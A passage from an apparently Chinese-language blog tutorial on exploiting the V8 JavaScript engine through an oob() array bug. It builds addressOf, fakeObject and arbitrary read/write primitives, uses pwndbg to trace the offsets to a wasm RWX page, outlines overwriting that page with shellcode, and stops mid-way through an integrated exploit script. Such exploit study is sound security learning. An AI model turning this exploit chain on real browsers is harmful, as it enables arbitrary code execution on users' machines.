class="comment">//伪造一个对象</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj's elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="comment">// 任意地址读</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 任意地址写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××4. 测试××××××××</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> address = addressOf(a);</span><br><span class="line"><span class="keyword">var</span> read = read64(address);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*]read 0x"</span>+hex(address)+<span class="string">":0x"</span>+hex(read));</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line">write64(address,<span class="number">0x01020304n</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<p>创建一个对象，找到他的地址。</p>
<p>读取对象地址存储的内容，然后改写对象地址存储的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">[*]read 0x000031f15738fa50:0x0000369d9e942ed9&#x2F;&#x2F;读取出来对象地址存的数据是0x0000369d9e942ed9</span><br><span class="line">0x31f15738fa51 &lt;JSArray[3]&gt;</span><br><span class="line">&#x2F;&#x2F;查看对象地址的内存，发现和读取出来的一样</span><br><span class="line">pwndbg&gt; telescope 0x000031f15738fa50</span><br><span class="line">00:0000│   0x31f15738fa50 —▸ 0x369d9e942ed9 ◂— 0x400002d1469d401 &lt;&#x3D;对象地址，存储的内容被读取</span><br><span class="line">01:0008│   0x31f15738fa58 —▸ 0x2d1469d40c71 ◂— 0x2d1469d408</span><br><span class="line">02:0010│   0x31f15738fa60 —▸ 0x31f15738fa29 ◂— 0x2d1469d414</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x000031f15738fa50</span><br><span class="line">00:0000│   0x31f15738fa50 ◂— 0x1020304				&lt;&#x3D;对象地址，存储的内容被改写</span><br><span class="line">01:0008│   0x31f15738fa58 —▸ 0x2d1469d40c71 ◂— 0x2d1469d408</span><br><span class="line">02:0010│   0x31f15738fa60 —▸ 0x31f15738fa29 ◂— 0x2d1469d414</span><br></pre></td></tr></table></figure>

<p>成功！！</p>
<h4 id="任意写改进"><a href="#任意写改进" class="headerlink" title="任意写改进"></a>任意写改进</h4><p>问题：通过上面的方式任意地址写，在写0x7fxxxx这样的高地址的时候会出现问题，地址的低位会被修改，导致出现访问异常。</p>
<p>解决：DataView对象中的<code>backing_store</code>会指向申请的<code>data_buf</code>（<code>backing_store</code>相当于我们的elements），修改<code>backing_store</code>为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>, data, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[*] write to : 0x"</span> +hex(addr) + <span class="string">": 0x"</span> + hex(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="浏览器运行shellcode：wasm"><a href="#浏览器运行shellcode：wasm" class="headerlink" title="浏览器运行shellcode：wasm"></a>浏览器运行shellcode：wasm</h3><blockquote>
<p>wasm是让JavaScript直接执行高级语言生成的机器码的一种技术。</p>
<p>使用：网站<a href="https://wasdk.github.io/WasmFiddle/：在线将C语言直接转换为wasm并生成JS配套调用代码。（左下角选择Code" target="_blank" rel="noopener">https://wasdk.github.io/WasmFiddle/：在线将C语言直接转换为wasm并生成JS配套调用代码。（左下角选择Code</a> Buffer，然后点击最上方的Build按钮，左下角生成了我们需要的wasm代码。）</p>
<p><img src="/2020/10/23/17-42-undefined/image-20201017005734798.png" alt="image-20201017005734798"></p>
<p>问题：wasm中只能运行数学计算、图像处理等系统无关的高级语言代码。所以不能直接在wasm中写入我们的shellcode，然后浏览器调用执行。</p>
<p>方案：结合漏洞将原本内存中的的wasm代码替换为shellcode，当后续调用wasm的接口时，实际上调用的就是我们的shellcode了。</p>
</blockquote>
<p>步骤：</p>
<p>1.首先加载一段wasm代码到内存中</p>
<p>2.然后通过addressOf找到存放wasm的内存地址</p>
<p>3.接着通过任意地址写原语用shellcode替换原本wasm的代码内容</p>
<p>4.最后调用wasm的函数接口即可触发调用shellcode</p>
<h4 id="寻找存放wasm代码的内存页地址"><a href="#寻找存放wasm代码的内存页地址" class="headerlink" title="寻找存放wasm代码的内存页地址"></a>寻找存放wasm代码的内存页地址</h4><p>通过Function–&gt;shared_info–&gt;WasmExportedFunctionData–&gt;instance，在instance+0x88的固定偏移处，就能读取到存储wasm代码的内存页起始地址。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.js，用debug版本调试</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x2c708e5dfab9: [Function] in OldSpace</span><br><span class="line"> - map: 0x07f1e5ac4379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2c708e5c2109 &lt;JSFunction (sfi &#x3D; 0x84e79c8039)&gt;</span><br><span class="line"> - elements: 0x1c0c1f4c0c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x2c708e5dfa81 &lt;SharedFunctionInfo 0&gt;             &lt;&#x3D; shared_info</span><br><span class="line"> - name: 0x1c0c1f4c4ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line">[...]</span><br><span class="line">&#x2F;&#x2F;shared_info在Function+0x18的位置</span><br><span class="line">pwndbg&gt; telescope 0x2c708e5dfab9-1</span><br><span class="line">00:0000│   0x2c708e5dfab8 —▸ 0x7f1e5ac4379 ◂— 0x700001c0c1f4c01</span><br><span class="line">01:0008│   0x2c708e5dfac0 —▸ 0x1c0c1f4c0c71 ◂— 0x1c0c1f4c08</span><br><span class="line">... ↓</span><br><span class="line">03:0018│   0x2c708e5dfad0 —▸ 0x2c708e5dfa81 ◂— 0x5900001c0c1f4c09 	&lt;&#x3D; here(看最左边这个03:0018)</span><br><span class="line">04:0020│   0x2c708e5dfad8 —▸ 0x2c708e5c1869 ◂— 0x1c0c1f4c0f</span><br><span class="line">05:0028│   0x2c708e5dfae0 —▸ 0x84e79c0699 ◂— 0xd100001c0c1f4c15</span><br><span class="line">06:0030│   0x2c708e5dfae8 —▸ 0x3e5b7d3c2001 ◂— or     cl, byte ptr [rdi + rbx + 0xc]</span><br><span class="line">07:0038│   0x2c708e5dfaf0 —▸ 0x1c0c1f4c0bc1 ◂— 0x1c0c1f4c01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x2c708e5dfa81</span><br><span class="line">0x2c708e5dfa81: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: 0x1c0c1f4c09e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x1c0c1f4c4ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x2c708e5dfa59 &lt;WasmExportedFunctionData&gt;					&lt;&#x3D; WasmExportedFunctionData</span><br><span class="line"> - code (from data): 0x3e5b7d3c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: -1</span><br><span class="line">[...]</span><br><span class="line">&#x2F;&#x2F;WasmExportedFunctionData在SharedFunctionInfo+0x8的位置</span><br><span class="line">pwndbg&gt; telescope 0x2c708e5dfa81-1</span><br><span class="line">00:0000│   0x2c708e5dfa80 —▸ 0x1c0c1f4c09e1 ◂— 0x700001c0c1f4c01</span><br><span class="line">01:0008│   0x2c708e5dfa88 —▸ 0x2c708e5dfa59 ◂— 0x100001c0c1f4c58	&lt;&#x3D; here(看最左边这个01:0008)</span><br><span class="line">02:0010│   0x2c708e5dfa90 —▸ 0x1c0c1f4c4ae1 ◂— 0x1c0c1f4c04</span><br><span class="line">03:0018│   0x2c708e5dfa98 —▸ 0x1c0c1f4c2a39 ◂— 0x1c0c1f4c13</span><br><span class="line">04:0020│   0x2c708e5dfaa0 —▸ 0x1c0c1f4c04d1 ◂— 0x1c0c1f4c05</span><br><span class="line">05:0028│   0x2c708e5dfaa8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">07:0038│   0x2c708e5dfab8 —▸ 0x7f1e5ac4379 ◂— 0x700001c0c1f4c01</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x2c708e5dfa59</span><br><span class="line">0x2c708e5dfa59: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"> - map: 0x1c0c1f4c5879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x3e5b7d3c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x2c708e5df8c1 &lt;Instance map &#x3D; 0x7f1e5ac9789&gt;			&lt;&#x3D; instance</span><br><span class="line"> - function_index: 0</span><br><span class="line">&#x2F;&#x2F;instance在WasmExportedFunctionData+0x10的位置</span><br><span class="line">pwndbg&gt; telescope 0x2c708e5dfa59-1</span><br><span class="line">00:0000│   0x2c708e5dfa58 —▸ 0x1c0c1f4c5879 ◂— 0x500001c0c1f4c01</span><br><span class="line">01:0008│   0x2c708e5dfa60 —▸ 0x3e5b7d3c2001 ◂— or     cl, byte ptr [rdi + rbx + 0xc]</span><br><span class="line">02:0010│   0x2c708e5dfa68 —▸ 0x2c708e5df8c1 ◂— 0x71000007f1e5ac97	&lt;&#x3D; here(看最左边这个02:0010)</span><br><span class="line">03:0018│   0x2c708e5dfa70 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">05:0028│   0x2c708e5dfa80 —▸ 0x1c0c1f4c09e1 ◂— 0x700001c0c1f4c01</span><br><span class="line">06:0030│   0x2c708e5dfa88 —▸ 0x2c708e5dfa59 ◂— 0x100001c0c1f4c58</span><br><span class="line">07:0038│   0x2c708e5dfa90 —▸ 0x1c0c1f4c4ae1 ◂— 0x1c0c1f4c04</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x2c708e5df8c1-1+0x88</span><br><span class="line">00:0000│   0x2c708e5df948 —▸ 0x1864fd681000 ◂— movabs r10, 0x1864fd681260 &#x2F;* 0x1864fd681260ba49 *&#x2F;</span><br><span class="line">01:0008│   0x2c708e5df950 —▸ 0x6158a14e409 ◂— 0x71000007f1e5ac91</span><br><span class="line">02:0010│   0x2c708e5df958 —▸ 0x6158a14e679 ◂— 0x71000007f1e5acad</span><br><span class="line">03:0018│   0x2c708e5df960 —▸ 0x2c708e5c1869 ◂— 0x1c0c1f4c0f</span><br><span class="line">04:0020│   0x2c708e5df968 —▸ 0x2c708e5df9e9 ◂— 0x71000007f1e5aca1</span><br><span class="line">05:0028│   0x2c708e5df970 —▸ 0x1c0c1f4c04d1 ◂— 0x1c0c1f4c05</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; vmmap 0x1864fd681000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x1864fd681000     0x1864fd682000 rwxp     1000 0       +0x0</span><br></pre></td></tr></table></figure>

<p>所以，根据以上，可以编写代码自动查找该地址。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak rwx_page_addr: 0x"</span> + hex(rwx_page_addr));</span><br></pre></td></tr></table></figure>

<p>整合的调试代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();<span class="comment">//oob函数出来的就是map</span></span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;<span class="comment">//泄漏出来的地址-1才是真实地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//地址需要+1才是v8中的正确表达方式</span></span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××3.read &amp; write anywhere××××××××</span></span><br><span class="line"><span class="comment">// 这是一块我们可以控制的内存</span></span><br><span class="line"><span class="keyword">var</span> fake_array = [				<span class="comment">//伪造一个对象</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj's elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="comment">// 任意地址读</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 任意地址写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span 